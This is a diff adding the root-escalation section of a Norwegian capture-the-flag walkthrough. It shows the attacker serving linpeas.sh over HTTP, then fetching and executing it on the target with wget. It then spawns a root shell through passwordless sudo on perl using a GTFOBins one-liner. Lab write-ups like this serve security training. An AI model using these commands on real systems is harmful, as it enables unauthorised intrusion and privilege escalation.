@@ -61,3 +61,27 @@ Vi får user flag i /home/shelly.
 cat user.txt
 2ec24e11320026xxxxxxxxxx
 ```
+  
+### Root
+  Vi overfører linpeas.sh til maskinen.
+  #### Vår maskin:
+```
+  python3 -m http.server
+ ```
+  #### Målets maskin:
+  ```
+  wget xx.xx.xx.xx:8000/linpeas.sh
+  chmod +x linpeas.sh
+  ./linpeas.sh
+  ```
+Linpeas forteller at shelly kan kjøre perl uten passord som sudo. <a href="https://gtfobins.github.io/">GTFObins</a> er en fantastisk side for å finne exploits for root esculation for slikt, og vi finner en kommando der som gir oss root.
+  
+  ```
+  perl -e 'exec "/bin/sh";'
+  whoami
+  root
+  cd /root
+  cat root.txt
+  xxxxxxxxxxxxxxxxxxxxxxxxxx
+  ```
+  
